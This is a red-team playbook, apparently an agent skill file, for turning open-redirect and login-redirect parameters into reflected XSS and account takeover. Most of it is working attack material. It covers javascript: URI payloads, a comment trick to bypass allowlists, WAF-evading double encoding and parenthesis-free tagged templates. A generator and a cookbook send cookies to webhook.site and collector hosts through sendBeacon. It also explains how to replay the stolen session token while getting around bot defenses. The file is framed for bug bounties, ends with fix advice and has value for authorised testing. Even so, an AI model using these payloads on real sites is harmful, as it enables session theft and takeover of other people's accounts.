---
name: redirect-javascript-uri-xss
description: Turn open-redirect and login-redirect parameters into XSS and account takeover — javascript: URI in ?redirect/?next/?url reaching location.replace/assign, substring allowlist bypass, double-decode WAF evasion, parenthesis-free payloads via tagged templates, sendBeacon cookie exfiltration, non-HttpOnly session token replay. Use when a redirect parameter exists, when an app "sanitizes" redirects with includes()/startsWith/indexOf, or when you need a zero-click XSS on an auth/identity domain.
version: 1.0.0
revision_date: 2026-11-11
license: MIT
category: redteam
tags: [xss, open-redirect, javascript-uri, account-takeover, auth]
---

# REDIRECT-JAVASCRIPT-URI-XSS — Open Redirect → XSS → ATO

## When to Use

Any parameter that decides where the browser goes next: `?redirect=`, `?next=`, `?url=`, `?return=`, `?returnTo=`, `?continue=`, `?dest=`, `?r=`, `?back=`, `?redirect_url=`, `?success_url=`, `?callback=`. Highest value on **login/logout/SSO** flows, because those pages typically:

- run on the identity/auth domain (`id.`, `login.`, `auth.`, `accounts.`)
- have an `isLoggedIn` check (so the victim is already authenticated)
- are trusted by every other subdomain

An open redirect alone is Low. `javascript:` in that parameter is **reflected XSS**, and if the session cookie is readable it is **account takeover**.

---

## Impact ladder — decide what you are reporting

| What you can prove | Report as |
|---|---|
| `Location: //evil.com` on server | Low/Medium open redirect |
| `javascript:` executes via `location` | High reflected XSS |
| XSS + cookie readable (`document.cookie`) | High/Critical |
| XSS + cookie replay gives authenticated API access | **Critical — ATO** |
| Same cookie accepted on other subdomains | argue `S:C` (cross-subdomain takeover) |

---

## Step 1 — Enumerate the parameter

```bash
# crawl a login page and look for redirect-ish params
curl -s "https://TARGET/auth/login" | grep -Eo '(redirect|next|return|url|continue|dest|back)[A-Za-z_]*' | sort -u

# historical endpoints
waybackurls TARGET | grep -Ei 'login|auth|signin|logout' | grep -E '\?(redirect|next|return|url)='
```

Test each one with `https://collaborator/` first: if the response is `Location:` / `window.location = ".../collaborator"`, you have a sink.

---

## Step 2 — Find the sink in the bundle

Get the page's JS and search for navigation primitives:

```bash
grep -nE 'location\.(replace|assign|href)|window\.open\(|router\.(push|replace)|navigate\(' chunk.js
```

Then read the surrounding 500–1500 chars and answer:

1. **Which value reaches the sink** — the raw query value, or a `decodeURIComponent()` of it?
2. **How many decodes?** Each extra decode is a WAF bypass and a filter bypass.
3. **What is the gate?** Typical bad patterns:

```js
["target.com"].some(x => value.includes(x))     // substring allowlist  ← bypass
value.startsWith("https://target.com")          // prefix check        ← partially bypassable
!value.includes("<") && !value.includes("(")    // "sanitizer"         ← grammar constraint
value.startsWith("/")                           // relative-only       ← hard to bypass
```

4. **Is execution conditional?** e.g. `isLoggedIn = !!cookie("SESSION")` — note the precondition (only logged-in victims trigger it).

### The substring-allowlist trick

If the check is `includes("target.com")`, the string can appear **anywhere**, including inside a JS comment:

```js
javascript:/*https://target.com*/<code>
```

The comment satisfies every substring check while the browser executes the rest.

---

## Step 3 — Respect the grammar

When the gate blocks `<` and `(`, keep the payload:

- **no `<`** → avoid HTML entirely (this is not an HTML injection)
- **no `(`** → call functions with **tagged templates**

```js
alert`x`                          // alert("x", ["x"])      → shows x
navigator.sendBeacon`https://u?`  // sendBeacon("https://u?")
String.fromCharCode`40`           // "("  ← build forbidden chars
setTimeout`<code>`                // executes <code> later
fn.call` `                        // calls fn with no args
```

Everything inside `${...}` of a template literal is still source code, so interpolation is free:

```js
navigator.sendBeacon`https://collector?src=beacon&v=${document.cookie}`
```

To call a method that needs a second argument (e.g. `fetch` with `credentials`), you can't — either use `sendBeacon` (sends cookies) or obtain a function reference and use `.call`/`.apply` via tagged templates.

---

## Step 4 — Encoding ladder

Purpose of each layer:

| layer | example | why |
|---|---|---|
| scheme obfuscation | `javascript:` → `%6aavascript%3A` | hides the literal from WAF/regex |
| space | ` ` → `%20` | survives query parsing |
| full value | `encodeURIComponent(v)` | produces the wire form (`%` → `%25`) |

If the app decodes the value **twice** (framework decode + explicit `decodeURIComponent`), a single `encodeURIComponent` of `%6aavascript%3A` is enough. Always verify by decoding twice and comparing to your intended JS.

### Generator

```js
const TOK = "collector-token";
const W   = "https://webhook.site/" + TOK;
const enc = v2 => encodeURIComponent(v2.replace("javascript:", "%6aavascript%3A").replace(/ /g, "%20"));
const base = "https://TARGET/auth/login?redirect=";

const A = `javascript:/*http target.com*/location='${W}?'+document.cookie`;                 // navigates
const B = `javascript:/*http target.com*/navigator.sendBeacon\`${W}?src=beacon&v=\${document.cookie}\`;void 0`; // silent
const C = `javascript:/*http target.com*/navigator.sendBeacon\`${W}?src=tok&v=\${document.cookie.split\`SESSION=\`[1]}\`;void 0`;
const D = `javascript:/*http target.com*/alert\`XSS @ \${document.domain}\`;void 0`;       // visual proof

for (const p of [A, B, C, D]) console.log(base + enc(p));
```

### Pre-flight checks (do this every time)

```js
const js = decodeURIComponent(decodeURIComponent(new URL(url).searchParams.get("redirect")));
console.log({ blockedParen: js.includes("("), blockedLt: js.includes("<"), trusted: js.includes("target.com") });
```

- `blockedParen` / `blockedLt` must be `false`
- the trusted string must be present, and `http` must be present if the app requires it

Then fetch the URL with a normal HTTP client and confirm **`200` + the value reflected** (e.g. inside `__NEXT_DATA__`, an inline `window.__STATE__`, or a `<script>` var). Reflection proves the value reaches the client state; execution still needs a browser.

---

## Step 5 — Prove execution (browser-only)

`curl`, Repeater, Node `fetch` never execute JS. Use a real browser:

1. Log in normally on a **clean** URL (`/auth/login`, no query).
2. Open the payload URL in a new tab, do not interact.
3. Watch: collector hit, DevTools → Network (`sendBeacon`), or Burp HTTP history.

**Controls that kill false positives:**

| control | expected |
|---|---|
| same URL, logged-out/incognito profile | `200`, **no** hit |
| benign value (`https://wikipedia.org/target.com`) | no JS execution, normal redirect |
| remove the trusted-string comment | gate fails, no execution |
| replace `javascript:` with `data:text/html,<script>` | blocked (proves the gate, not the browser) |

---

## Step 6 — From XSS to ATO

Check the session cookie:

```js
document.cookie              // if the token appears, it is not HttpOnly
```

Then, for each cookie, record flags from the `Set-Cookie` header: `HttpOnly`, `Secure`, `SameSite`, `Domain`, `Max-Age`.

Replay proof (differential is mandatory):

```
GET /api/<authenticated-endpoint>          → 200 (with stolen cookie)
GET /api/<authenticated-endpoint>          → 400/401 (without cookie)
GET /api/<authenticated-endpoint>          → 401 (cookie with 1 char of signature changed)
```

The tampered-signature request is the anti-false-positive control: it proves the server verifies the token and that `200` maps to the victim's identity.

If the API sits behind bot defense that blocks non-browser TLS fingerprints (e.g. `403` + `X-Sentinel-Action: blocked`), pick an endpoint **without** that protection (app-specific proxies such as `/api/<service>/...` on the product host usually pass) rather than concluding the token is useless.

---

## Payload cookbook

| goal | payload body (after `javascript:/*http target.com*/`) |
|---|---|
| navigate with full jar | `location='https://C?'+document.cookie` |
| silent full jar | ``navigator.sendBeacon`https://C?src=b&v=${document.cookie}`;void 0`` |
| silent single token | ``navigator.sendBeacon`https://C?src=t&v=${document.cookie.split`SESSION=`[1]}`;void 0`` |
| visible popup | ``alert`XSS @ ${document.domain}`;void 0`` |
| tab title proof | `document.title='XSS'+document.domain;void 0` |
| write into page | `document.body.innerText=document.domain;void 0` |
| read something same-origin | ``navigator.sendBeacon`https://C?d=${encodeURIComponent(document.body.innerText)}`;void 0`` |
| get parens back | `String.fromCharCode`40`` |

Rules: no `<`, no `(`, keep the trusted string + `http`, double-encode the scheme.

### Field notes (verified in practice)

- **Two strings, not one:** many gates require BOTH `http` and the brand domain (e.g. `indexOf("http") >= 0` + `allowlist.includes("brand.com")`). Put both in the comment: `/*http brand.com*/`.
- **Tagged template quirk:** ``sendBeacon`url` `` passes the *strings array* as arg1 and every `${...}` as **additional args**. With a plain string URL, the array stringifies cleanly; the collector sees a harmless trailing `,` on the query and the interpolated values in the **body** (`text/plain`). That is the exfil channel.
- **`encodeURIComponent` does not escape** `'`, `(`, `)`, `!`, `*`, `~`. `(` is therefore only safe because you never write it; verify the *decoded* value, not the encoded one.
- **`location = x`** and **`location.replace(x)`** behave the same for `javascript:` URLs in Chromium/WebKit; both are valid sinks.
- **Check the decoder count empirically:** send `%252F` and see whether the sink receives `%2F` or `/`. Two decodes means one `encodeURIComponent` over an already-`%xx`-escaped scheme.
- **WAF:** the obfuscated scheme (`%6aavascript%3A`) plus the absence of `(` and `<` usually survives edge rules; if the edge blocks the collector domain, use a domain that matches the edge allowlist (many CDNs allow `*.brand.com` only).

---

## Pitfalls that waste hours

1. **Persisted redirect** — many SPAs store the parameter in `localStorage` (e.g. `*-redirect-url`) and re-execute on every visit. If you opened the payload while logged out, the site may loop forever. Cleanup:
   ```js
   localStorage.removeItem('bioma-auth-redirect-url'); localStorage.removeItem('logout-redirect-url');
   localStorage.clear(); sessionStorage.clear();
   ```
2. **Wrong collector token** — regenerating payloads for a new webhook is mandatory; a stale URL silently "proves nothing".
3. **`document.cookie` on `file://`** — empty. Always test on the real origin.
4. **`SameSite=Strict/Lax`** — irrelevant when the JS runs on the cookie's own site.
5. **CSP with only `frame-ancestors`** — does not block `javascript:`. A `script-src` **without** `unsafe-inline` would.
6. **Bot defense on the API** — TLS/JA4 fingerprint blocks Repeater; use the browser or an unprotected endpoint.
7. **URL printed by the browser** — Chrome percent-decodes the address bar; screenshot the encoded form from Burp, not the bar.

---

## Evidence package

- raw request/response of the reflection (`200` + payload in the HTML/JSON state)
- collector hit (headers + body), token masked
- differential replay (`200` vs `400/401`)
- tampered-signature `401`
- logged-out control (`200`, no hit)
- cookie flags screenshot (`HttpOnly` unchecked, `Max-Age` value)

Tag every request with your program header (e.g. `X-Bug-Bounty: handle`).

---

## Fix patterns (to recommend)

```js
// safe
const u = new URL(input, location.origin);
if (!["https:"].includes(u.protocol)) return fallback();
if (!ALLOWED_HOSTS.has(u.host)) return fallback();
location.replace(u.toString());
```

- exact-host allowlist, never `includes`/`startsWith`
- reject `javascript:`, `data:`, `vbscript:`
- `HttpOnly` (+ `__Host-`) on session cookies; short TTL; rotate on privilege change
- do not persist unvalidated redirects; validate again on read
- strict `script-src` CSP as defense in depth
- invalidate previously issued tokens after the fix

---

## Checklist

- [ ] parameter identified and reflected
- [ ] sink and decode count confirmed in the bundle
- [ ] gate reproduced locally (`blockedParen=false`, `blockedLt=false`, trusted string present)
- [ ] `200` from the target with the encoded payload
- [ ] execution proven in a logged-in browser, logged-out control shows nothing
- [ ] cookie readable (`document.cookie`) and flags recorded
- [ ] ATO replay `200` + no-cookie `400/401` + tampered-signature `401`
- [ ] evidence redacted, requests tagged, only own account used